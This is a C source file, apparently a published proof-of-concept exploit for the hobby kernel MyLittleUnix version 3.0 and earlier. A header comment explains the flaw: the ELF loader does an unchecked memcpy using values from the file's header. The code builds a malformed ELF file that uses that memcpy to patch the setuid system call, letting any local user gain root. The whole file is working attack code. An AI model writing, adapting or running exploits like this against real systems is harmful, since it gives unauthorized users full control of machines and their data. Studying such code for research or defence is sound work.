/* rainbowdash.c - MyLittleUnix <= 3.0 ELF loader privilege escalation exploit
   ===========================================================================
   This generates a malformed ELF executable that when attempted to be loaded
   on MyLittleUnix <= 3.0 will overwrite a comparison in sys_setuid to assign
   root privileges for anypony who asks. The vulnerability exists as the ELF 
   loader is fairly primative within MyLittleUnix and after checking for MAGIC
   the loader will parse the binary and do a memcpy using the variables from
   the header without any checking. The vulnerable code is on line 70 within
   kernel/misc/elf.c in function exec_elf(). The sys_setuid will never allow
   anyone other than root to setuid as it checks the current_uid, a simple 
   two byte patch to this function preventing the check from occuring will 
   allow anyone on the system to setuid(0); and gain root privileges. This 
   code outputs a "./pwnie.bin" file which when executed will patch the syscall
   for abuse.

   -- Hacker Fantastic (http://www.mdsec.co.uk)
   
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

char *shellcode = "\x90\x90";

int main(){
	int fd;
	Elf32_Ehdr * elfhdr = malloc(sizeof(Elf32_Ehdr));
	Elf32_Shdr * shdr = malloc(sizeof(Elf32_Shdr));
	if(!elfhdr)
		exit(0);
	elfhdr->e_ident[EI_MAG0]=ELFMAG0;
	elfhdr->e_ident[EI_MAG1]=ELFMAG1;
	elfhdr->e_ident[EI_MAG2]=ELFMAG2;
	elfhdr->e_ident[EI_MAG3]=ELFMAG3;
	elfhdr->e_shnum = 1;
	elfhdr->e_shentsize = sizeof(Elf32_Shdr);
	elfhdr->e_shoff = sizeof(Elf32_Ehdr);
	shdr->sh_addr =  0x0010f103; // sys_setuid jne patch
	shdr->sh_offset = sizeof(Elf32_Ehdr) + sizeof(Elf32_Shdr);
	shdr->sh_size = 2; // patch
	fd = open("./pwnie.bin",O_CREAT|O_RDWR,0700);
	write(fd,(void*)elfhdr,sizeof(Elf32_Ehdr));
	write(fd,(void*)shdr,sizeof(Elf32_Shdr));
	write(fd,(void*)shellcode,sizeof(shellcode));
	close(fd);
	exit(0);
}
